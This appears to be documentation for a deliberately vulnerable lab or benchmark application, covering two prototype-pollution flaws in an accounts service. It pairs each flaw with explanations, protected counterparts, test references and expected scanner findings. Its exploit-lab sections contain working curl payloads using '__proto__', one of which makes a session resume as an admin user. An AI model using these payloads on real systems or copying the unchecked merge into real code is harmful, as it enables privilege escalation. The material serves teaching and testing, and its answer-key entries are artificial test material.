# `PROTO` — prototype pollution

Two weaknesses of the legacy settings paths in `accounts`. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults). Both are observed through the service itself: after the pollution, a field another caller omitted gains a value.

## PROTO-001 — the dotted path is walked without checks

### PROTO-001 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `setPreferenceByPath(path: String!, value: String!)` |
| Sink | Every path segment followed as written, in `apps/accounts/src/legacy/preferences-path.resolver.ts` |
| Flow | `__proto__.theme` → the walk leaves the preferences document → `Object.prototype.theme` is set for the whole process |
| Counterparts | `apps/accounts/src/profile/profile.resolver.ts` (`setPreference`: an enum names the one key; `setPreferencePath`: allowlisted segments, own-property checks, a null-prototype map) |
| Tests | `apps/accounts/test/scenarios/proto-re-res.int-spec.ts` |
| Expected finding | Yes, CWE-1321, SAST |

### PROTO-001 — student guide

A dotted path is a walk over objects. When no segment is checked, `__proto__` is a segment like any other, and what the walk writes then is not the caller's document but the prototype every object in the process inherits from. The observation needs no access to memory: any later reader of an absent field reads the pollution.

### PROTO-001 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    -d '{"query":"mutation { setPreferenceByPath(path: \"__proto__.theme\", value: \"zazzles-lab-marker\") { id } }"}'
{"data":{"setPreferenceByPath":{"id":"u-alice"}}}
```

The mutation answered as if a preference had been written. Now a resume cookie that carries a user and no theme:

```console
$ curl -s $RELAY/internal/sessions/resume-legacy -X POST -H 'cookie: vcx_remember={"userId":"u-alice"}'
{"status":"resumed","userId":"u-alice","theme":"zazzles-lab-marker"}
```

The theme came from the prototype, not the cookie: an argument another caller omitted has gained a value, process-wide. The same path through the counterpart:

```console
{"errors":[{"message":"__proto__ is not a preference name",
  "extensions":{"code":"BAD_USER_INPUT"}}]}
```

And `setPreference(name: THEME, …)` writes the caller's own theme and nothing else — the enum names the one key it may write.

### PROTO-001 — vulnerable and protected

| | Why |
| --- | --- |
| `setPreferenceByPath` (vulnerable) | Each segment is followed unchecked, so the walk reaches `Object.prototype` |
| `setPreference` (protected) | An enum names the single key; no path exists to walk |
| `setPreferencePath` (protected) | Segments are allowlisted, only own properties are followed, and the walk runs over a map with no prototype |

### PROTO-001 — tests

`apps/accounts/test/scenarios/proto-re-res.int-spec.ts`, `PROTO-001` (the last describe of the file): the path write pollutes and the omitted theme gains the marker; the enum mutation writes only its own key; the allowlisted walk refuses `__proto__`.

## PROTO-002 — the settings string is parsed and deep-merged

### PROTO-002 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `updateNotificationSettings(settings: String!)` |
| Sink | `JSON.parse` followed by an unchecked recursive merge, in `apps/accounts/src/legacy/notification-settings.resolver.ts` |
| Flow | `'{"__proto__":{"userId":"u-admin"}}'` → parsed (the parser defines the key, it does not follow it) → the merge follows it → `Object.prototype.userId` is set |
| Counterparts | `apps/accounts/src/profile/profile.resolver.ts` (`updatePreferences`: a typed input; `importSettings`: parsed, then a DTO whose transformation drops the key) |
| Tests | `apps/accounts/test/scenarios/proto-re-res.int-spec.ts` |
| Expected finding | Yes, CWE-1321, SAST |

### PROTO-002 — student guide

`JSON.parse` does not call the `__proto__` setter: it defines an own property, which is exactly why a merge that follows keys can be pointed at the prototype. The string form gets past the body parser's guard too — the guard protects the transport, not what a resolver does with a string it was handed.

### PROTO-002 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    --data-raw '{"query":"mutation ($s: String!) { updateNotificationSettings(settings: $s) { id } }","variables":{"s":"{\"__proto__\":{\"userId\":\"u-admin\"}}"}}'
{"data":{"updateNotificationSettings":{"id":"u-alice"}}}
```

Then the same resume route, with a cookie that carries a theme and no user:

```console
$ curl -s $RELAY/internal/sessions/resume-legacy -X POST -H 'cookie: vcx_remember={"theme":"dark"}'
{"status":"resumed","userId":"u-admin","theme":"dark"}
```

The user came from the prototype. The same document as `updatePreferences` input does not even arrive: the body parser refuses it (`Body is not valid JSON`). The same text to `importSettings` succeeds with the preferences unchanged — the parsed document is turned into a typed input whose transformation drops the key, so no merge ever sees it.

### PROTO-002 — vulnerable and protected

| | Why |
| --- | --- |
| `updateNotificationSettings` (vulnerable) | Every key of the parsed document is followed, `__proto__` included |
| `updatePreferences` (protected) | A typed input of four fields; the document's extra key cannot even be handed to it |
| `importSettings` (protected) | The same text parses, and the DTO's transformation drops the key before any merge |

### PROTO-002 — tests

`apps/accounts/test/scenarios/proto-re-res.int-spec.ts`, `PROTO-002`: the merge pollutes and the omitted userId gains `u-admin`; the typed input cannot be handed the document; `importSettings` leaves the preferences as they were.
